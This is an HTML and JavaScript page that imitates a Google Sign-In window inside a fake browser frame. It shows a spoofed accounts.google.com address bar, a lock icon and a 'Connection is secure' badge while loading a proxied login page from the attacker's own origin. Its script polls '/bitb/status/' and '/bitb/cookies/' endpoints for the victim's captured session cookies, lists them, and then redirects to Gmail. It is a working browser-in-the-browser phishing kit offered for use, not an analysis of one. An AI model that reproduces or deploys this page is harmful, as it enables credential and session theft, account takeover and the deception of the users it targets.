<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Sign-In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#1a1a2e;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;overflow:hidden}
.desktop-bg{position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(ellipse at center,#16213e 0%,#0f0f1a 100%);z-index:0}
.browser{position:relative;z-index:1;width:900px;max-width:95vw;height:680px;max-height:90vh;background:#fff;border-radius:12px;box-shadow:0 25px 60px rgba(0,0,0,.5),0 0 0 1px rgba(255,255,255,.08);display:flex;flex-direction:column;overflow:hidden}
.title-bar{display:flex;align-items:center;padding:10px 16px;background:#f0f0f0;border-bottom:1px solid #d0d0d0;flex-shrink:0}
.window-dots{display:flex;gap:8px;margin-right:16px}
.dot{width:13px;height:13px;border-radius:50%}
.dot.red{background:#ff5f57;border:1px solid #e0443e}
.dot.yellow{background:#ffbd2e;border:1px solid #dea123}
.dot.green{background:#28c840;border:1px solid #1aab2f}
.title-text{font-size:13px;color:#555;flex:1;text-align:center;user-select:none}
.url-bar{display:flex;align-items:center;gap:10px;padding:8px 14px;background:#f5f5f5;border-bottom:1px solid #e0e0e0;flex-shrink:0}
.nav-btn{width:28px;height:28px;border-radius:6px;border:none;background:transparent;color:#666;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:13px}
.nav-btn:hover{background:#e0e0e0}
.nav-btn:disabled{opacity:.3;cursor:default}
.url-input{flex:1;padding:6px 14px;border:1px solid #d0d0d0;border-radius:20px;font-size:13px;background:#fff;outline:none;color:#1a73e8;font-weight:500;text-overflow:ellipsis;overflow:hidden;white-space:nowrap}
.lock-icon{color:#666;font-size:13px;margin-right:-6px}
.content{flex:1;position:relative;background:#fff;overflow:hidden}
.content iframe{width:100%;height:100%;border:none;display:block}
.loading{position:absolute;top:0;left:0;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#fff;z-index:10;transition:opacity .4s}
.loading.hidden{opacity:0;pointer-events:none}
.loading-spinner{width:36px;height:36px;border:3px solid #e0e0e0;border-top-color:#1a73e8;border-radius:50%;animation:spin .8s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.loading-text{margin-top:14px;font-size:14px;color:#666}
.loading-sub{font-size:12px;color:#999;margin-top:6px}
.security-badge{position:absolute;bottom:12px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,.75);color:#fff;padding:6px 14px;border-radius:20px;font-size:11px;display:flex;align-items:center;gap:6px;z-index:5;pointer-events:none;backdrop-filter:blur(4px)}
#statusOverlay{position:absolute;top:0;left:0;width:100%;height:100%;display:none;flex-direction:column;align-items:center;justify-content:center;background:#fff;z-index:20;text-align:center;padding:40px}
#statusOverlay.show{display:flex}
.status-icon{font-size:48px;margin-bottom:16px}
.status-title{font-size:22px;font-weight:600;color:#222;margin-bottom:8px}
.status-desc{font-size:14px;color:#666;max-width:400px;line-height:1.5}
.status-cookies{margin-top:20px;text-align:left;width:100%;max-width:500px;max-height:200px;overflow-y:auto;background:#f8f8f8;border-radius:8px;padding:12px}
.status-cookies table{width:100%;font-size:12px;border-collapse:collapse}
.status-cookies th{text-align:left;padding:4px 8px;background:#eee;font-weight:600}
.status-cookies td{padding:4px 8px;border-bottom:1px solid #eee;word-break:break-all;max-width:200px;overflow:hidden;text-overflow:ellipsis}
.redirect-btn{margin-top:20px;padding:10px 30px;background:#1a73e8;color:#fff;border:none;border-radius:6px;font-size:14px;cursor:pointer}
.redirect-btn:hover{background:#1557b0}
#progressBar{margin-top:16px;width:280px;height:4px;background:#e0e0e0;border-radius:2px;overflow:hidden}
#progressFill{height:100%;background:#1a73e8;border-radius:2px;width:0%;transition:width .5s}
</style>
</head>
<body>
<div class="desktop-bg"></div>

<div class="browser" id="browser">
  <div class="title-bar">
    <div class="window-dots">
      <div class="dot red"></div>
      <div class="dot yellow"></div>
      <div class="dot green"></div>
    </div>
    <span class="title-text">accounts.google.com - Google Sign-In</span>
  </div>

  <div class="url-bar">
    <button class="nav-btn" id="backBtn" disabled>&#8592;</button>
    <button class="nav-btn" id="fwdBtn" disabled>&#8594;</button>
    <button class="nav-btn" id="refreshBtn">&#8635;</button>
    <span class="lock-icon">&#128274;</span>
    <div class="url-input" id="urlDisplay">https://accounts.google.com/signin/v2/identifier</div>
  </div>

  <div class="content" id="contentArea">
    <div class="loading" id="loadingOverlay">
      <div class="loading-spinner"></div>
      <div class="loading-text" id="loadingText">Establishing secure connection...</div>
      <div class="loading-sub" id="loadingSub">Contacting Google servers</div>
    </div>
    <iframe id="loginFrame" name="loginFrame" sandbox="allow-scripts allow-forms allow-same-origin allow-popups allow-popups-to-escape-sandbox allow-top-navigation-by-user-activation" allow="camera;microphone;publickey-credentials-get"></iframe>
    
    <div id="statusOverlay">
      <div class="status-icon" id="statusIcon">&#9989;</div>
      <div class="status-title" id="statusTitle">Sign in successful</div>
      <div class="status-desc" id="statusDesc">Your session has been verified. You will be redirected shortly.</div>
      <div id="progressBar"><div id="progressFill"></div></div>
      <div class="status-cookies" id="cookieList" style="display:none"></div>
      <button class="redirect-btn" id="redirectBtn" onclick="redirectToGmail()">Continue to Gmail</button>
    </div>

    <div class="security-badge">
      <span>&#10004;</span> Connection is secure
    </div>
  </div>
</div>

<script>
(function(){
  var currentUrl = new URL(window.location.href);
  var loginPath = '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin';
  var iframeSrc = currentUrl.origin + loginPath;

  var iframe = document.getElementById('loginFrame');
  var loading = document.getElementById('loadingOverlay');
  var loadingText = document.getElementById('loadingText');
  var loadingSub = document.getElementById('loadingSub');
  var urlDisplay = document.getElementById('urlDisplay');
  var statusOverlay = document.getElementById('statusOverlay');

  function setLoading(text, sub) {
    loading.classList.remove('hidden');
    loadingText.textContent = text || 'Loading...';
    loadingSub.textContent = sub || '';
  }

  function hideLoading() {
    loading.classList.add('hidden');
  }

  function updateUrl(url) {
    try {
      var u = new URL(url);
      urlDisplay.textContent = 'https://accounts.google.com' + u.pathname + u.search + u.hash;
    } catch(e) {}
  }

  iframe.addEventListener('load', function() {
    hideLoading();
    try {
      var src = iframe.contentWindow.location.href;
      if (src) updateUrl(src);
    } catch(e) {}
  });

  setLoading('Establishing secure connection...', 'Contacting Google servers');
  iframe.src = iframeSrc;

  function showSuccess(cookies) {
    statusOverlay.classList.add('show');
    document.getElementById('statusIcon').innerHTML = '&#9989;';
    document.getElementById('statusTitle').textContent = 'Sign in successful';
    document.getElementById('statusDesc').textContent = 'Your session has been verified. ' + (cookies ? cookies.length + ' session tokens captured.' : 'Redirecting...');

    var pb = document.getElementById('progressFill');
    pb.style.width = '0%';
    var p = 0;
    var pi = setInterval(function() {
      p += 2;
      pb.style.width = Math.min(p, 100) + '%';
      if (p >= 100) clearInterval(pi);
    }, 100);

    if (cookies && cookies.length > 0) {
      var cl = document.getElementById('cookieList');
      cl.style.display = 'block';
      var html = '<table><thead><tr><th>Name</th><th>Domain</th><th>Value</th></tr></thead><tbody>';
      cookies.slice(0, 20).forEach(function(c) {
        var val = c.value || '';
        html += '<tr><td>' + escapeHtml(c.name) + '</td><td>' + escapeHtml(c.domain || '') + '</td><td title="' + escapeHtml(val) + '">' + escapeHtml(val.substring(0, 40)) + (val.length > 40 ? '...' : '') + '</td></tr>';
      });
      html += '</tbody></table>';
      cl.innerHTML = html;
    }

    setTimeout(redirectToGmail, 5000);
  }

  function showError(msg) {
    statusOverlay.classList.add('show');
    document.getElementById('statusIcon').innerHTML = '&#10060;';
    document.getElementById('statusTitle').textContent = 'Sign in failed';
    document.getElementById('statusDesc').textContent = msg || 'An error occurred. Please try again.';
    document.getElementById('progressBar').style.display = 'none';
  }

  function redirectToGmail() {
    window.location.href = 'https://mail.google.com/mail/u/0/';
  }

  function escapeHtml(s) {
    if (!s) return '';
    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
  }

  // Poll for BITB status
  var pollInterval = setInterval(function() {
    var sid = getSessionId();
    if (!sid) return;

    fetch('/bitb/status/' + encodeURIComponent(sid))
      .then(function(r) { return r.json(); })
      .then(function(data) {
        if (data.status === 'complete') {
          clearInterval(pollInterval);
          fetch('/bitb/cookies/' + encodeURIComponent(sid))
            .then(function(r) { return r.json(); })
            .then(function(cd) {
              showSuccess(cd.cookies || []);
            })
            .catch(function() { showSuccess([]); });
        } else if (data.status === 'logging_in') {
          setLoading('Signing in...', 'Completing authentication');
        } else if (data.status === 'failed') {
          clearInterval(pollInterval);
          showError(data.error || 'Login failed');
        }
      })
      .catch(function() {});
  }, 2000);

  function getSessionId() {
    try {
      var c = document.cookie.split(';');
      for (var i = 0; i < c.length; i++) {
        var parts = c[i].split('=');
        if (parts[0].trim().endsWith('_sid')) return parts[1].trim();
        if (parts[0].trim() === 'sid') return parts[1].trim();
      }
    } catch(e) {}
    return null;
  }

  // Fallback: after 30s show success anyway (proxy captured cookies)
  setTimeout(function() {
    if (!statusOverlay.classList.contains('show')) {
      clearInterval(pollInterval);
      showSuccess([]);
    }
  }, 30000);
})();
</script>
</body>
</html>
